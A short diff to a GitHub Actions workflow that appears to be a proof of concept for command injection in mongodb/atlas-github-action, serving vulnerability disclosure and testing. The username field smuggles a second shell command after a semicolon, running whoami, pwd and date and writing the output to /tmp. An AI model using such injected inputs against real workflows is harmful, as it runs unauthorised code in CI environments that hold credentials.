@@ -15,11 +15,12 @@ jobs:
 
       - name: POC - Command Injection via username
         uses: mongodb/atlas-github-action@v0.2.0
+        continue-on-error: true
         with:
           run-setup: true
           # Command injection via username parameter
           # The username is inserted into FLAGS without quoting, allowing injection
-          username: "testuser; echo '🚨 INJECTION via username 🚨' && echo 'Executed as: '$(whoami) && touch /tmp/username-injection-poc.txt #"
+          username: "testuser; echo '🚨 INJECTION via username 🚨' > /tmp/username-injection-poc.txt && echo 'User:' $(whoami) && echo 'PWD:' $(pwd) && echo 'Date:' $(date) >> /tmp/username-injection-poc.txt || true #"
           password: "testpass123"
           tier: "M0"
           provider: "AWS"
